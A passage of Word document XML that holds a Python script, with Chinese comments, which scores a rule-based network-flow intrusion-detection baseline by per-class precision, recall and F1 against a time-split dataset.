      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4E74AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4157583B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55378CA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D5C1D59">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6290F150">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F021DF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ROOT = Path(__file__).resolve().parent.parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1C6AEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if str(ROOT) not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7269F683">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.path.insert(0, str(ROOT))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712013D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72CE2A2E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.rules import flow_rules, pick  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388575C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from models.train import RARE_CLASS_SUPPORT, load_dataset, split_by_time  # noqa: E402</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED3ECE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7798777E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="568FF5A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def baseline_predictions(X, feature_names) -&gt; list[str]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23332CEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """逐行跑单流规则，没命中就是 BENIGN。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742473B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E154884">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for row in X:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FCEC71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        feats = dict(zip(feature_names, (float(v) for v in row)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503D7442">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hit = pick(flow_rules(feats))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9327FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out.append(hit.category if hit else "BENIGN")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012A46AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AB31BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="313C51B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="004D5EFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def score(y_true, y_pred, classes) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61693041">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    per_class = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C4EC68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls in classes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C708E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tp = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7B416A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fp = sum(1 for t, p in zip(y_true, y_pred) if t != cls and p == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E24804">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fn = sum(1 for t, p in zip(y_true, y_pred) if t == cls and p != cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C824D7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        support = sum(1 for t in y_true if t == cls)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEB9896">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        precision = tp / (tp + fp) if tp + fp else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0FA5D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        recall = tp / (tp + fn) if tp + fn else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D5E844">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362D90A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        per_class[cls] = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A095490">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "precision": round(precision, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E52DB18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "recall": round(recall, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F801BD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "f1": round(f1, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FC8EA7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "support": support,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4E9D15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "reliable": support &gt;= RARE_CLASS_SUPPORT,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D0F0C8A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7454D58D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    reliable = [m for m in per_class.values() if m["reliable"]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A516AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    macro = sum(m["f1"] for m in reliable) / len(reliable) if reliable else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714B69B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    acc = sum(1 for t, p in zip(y_true, y_pred) if t == p) / len(y_true)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D87B308">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F838E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "accuracy": round(acc, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEF529E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "macro_f1_reliable": round(macro, 4),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A64344B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "per_class": per_class,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177154CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="134E82ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63D5DD9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A6C8D30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None) -&gt; int:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D178F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    parser = argparse.ArgumentParser(description="M11 单流规则基线（与小模型同口径）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5435BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    parser.add_argument("--data", required=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A431A2C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    parser.add_argument("--test-size", type=float, default=0.10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="395EF521">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    parser.add_argument("--val-size", type=float, default=0.20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B8B0BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    parser.add_argument("--out", default=str(ROOT / "models" / "artifacts" / "rules_baseline.json"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712DAB85">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = parser.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E8BA73">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6596B332">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, feature_names, meta = load_dataset(args.data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E1F003F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
